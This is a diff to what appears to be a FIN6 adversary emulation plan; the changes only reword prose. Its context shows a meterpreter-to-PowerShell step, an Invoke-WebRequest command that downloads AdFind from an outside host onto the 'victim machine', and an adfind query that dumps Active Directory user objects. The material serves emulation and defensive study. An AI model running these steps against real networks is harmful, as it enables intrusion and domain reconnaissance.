@@ -155,7 +155,7 @@ meterpreter > powershell_shell
 PS > 
 ```
 
-Afterward, execute the following command to initiate the installation process of AdFind on the target machine:
+Afterward, execute the following command to initiate the installation process of AdFind on the victim machine:
 
 ```ps
 $postParams = @{B1='Download+Now';download="AdFind.zip";email=''};
@@ -166,7 +166,7 @@ Invoke-WebRequest -Uri http://www.joeware.net/downloads/dl2.php -Method POST -Bo
 
 ### 2.2 - Account Discovery: Domain Account [**T1087.002**](https://attack.mitre.org/techniques/T1087/002/)
 
-FIN6 used AdFind to check for person objects on Active Directory, and output the results to a text file.
+FIN6 employed AdFind to search for person objects in Active Directory and saved the results to a text file.
 
 ```ps
 PS > adfind.exe -f "objectcategory=person" > ad_users.txt
